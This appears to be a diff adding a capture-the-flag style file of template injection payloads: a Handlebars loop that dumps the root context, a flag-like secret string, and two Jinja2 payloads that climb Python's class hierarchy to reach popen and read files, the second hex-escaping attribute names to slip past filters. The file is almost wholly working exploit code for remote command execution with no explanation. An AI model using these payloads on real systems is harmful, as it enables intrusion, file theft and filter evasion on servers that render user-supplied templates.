@@ -1,0 +1,8 @@
+{{#each @root}}
+  {{@index}}: {{this}}
+{{/each}}
+
+77777me0w_me0w_s3cr3t77777
+
+{{ ().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /th1s*').read() }}
+{{ ()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen')('cat /y000*')|attr('read')() }}
